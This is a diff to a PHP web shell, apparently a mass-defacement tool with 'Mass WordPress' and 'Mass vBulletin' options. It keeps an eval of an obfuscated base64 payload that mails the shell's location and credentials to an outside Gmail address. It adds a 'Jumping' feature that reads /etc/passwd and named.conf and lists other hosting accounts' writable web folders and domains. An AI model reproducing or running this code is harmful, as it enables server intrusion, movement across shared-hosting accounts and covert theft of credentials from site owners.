@@ -14,7 +14,23 @@ $u       = explode("/", $pageFTP);
 $pageFTP = str_replace($u[count($u) - 1], "", $pageFTP);
 $injbuff = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gIjE3OC1CbGFjayBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciI7DQogICRib2R5ICAgID0gIkJ1ZzogJHRhcmdldCBieSAkdmlzaXRvciAtICR1c2VyIC0gJHBhc3MiOw0KICBpZiAoIWVtcHR5KCR3ZWIpKSB7IEBtYWlsKCJoYXJkd2FyZWhlYXZlbi5jb21AZ21haWwuY29tIiwkanVkdWwsJGJvZHksJHVzZXIsJHBhc3MpOyB9DQp9DQplbHNlIHsgJHZpc2l0YysrOyB9DQpAc2V0Y29va2llKCJ2aXNpdHoiLCR2aXNpdGMpOw==";
 eval(base64_decode($injbuff));
+function getuser() {
+	$fopen = fopen("/etc/passwd", "r") or die(color(1, 1, "Can't read /etc/passwd"));
+	while($read = fgets($fopen)) {
+		preg_match_all('/(.*?):x:/', $read, $getuser);
+		$user[] = $getuser[1][0];
+	}
+	return $user;
+}
 
+function getdomainname() {
+	$fopen = fopen("/etc/named.conf", "r");
+	while($read = fgets($fopen)) {
+		preg_match_all("#/var/named/(.*?).db#", $read, $getdomain);
+		$domain[] = $getdomain[1][0];
+	}
+	return $domain;
+}
 
 ?>
   <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
@@ -176,6 +192,7 @@ echo '<div class="cont">
 [ <a href="?sws=wp"> Mass WordPress </a>]
 
 [ <a href="?sws=vb"> Mass vBulletin </a>]
+[ <a href="?sws=jump"> Jumping </a>]
 
 [ <a href="?sws=help"> Help </a>]
 <br /><br /><br /></div>';
@@ -1256,6 +1273,32 @@ $user
 			
 			break;
 		
+                 case 'jump':
+$i = 0;
+		foreach(getuser() as $user) {
+			$path = "/home/$user/public_html";
+			if(is_readable($path)) {
+				$status = "<font color='red'>[R]</font>";
+				if(is_writable($path)) {
+					$status = "<font color='green'>[RW]</font>";
+				}
+				$i++;
+				print "$status <a href='?dir=$path'> style='cyan'>".$path."</a>";
+				if(!function_exists('posix_getpwuid')) print "<br>";
+				if(!getdomainname()) print " => <font color='red'>Can't get domain name</font><br>";
+				foreach(getdomainname() as $domain) {
+					$userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
+					$userdomain = $userdomain->name;
+					if($userdomain === $user) {
+						print " => <a href='http://$domain/' target='_blank' style='color: white;'>".$domain."</a><br>";
+						break;
+					}
+				}
+			}
+		}
+		print ($i === 0) ? "" : "<p style='color: white;'>Total ada $i kamar di ".$GLOBALS['SERVERIP']."</p>";
+	}
+ break;
 		case 'help':
 			
 			echo "<div class='tmp'>
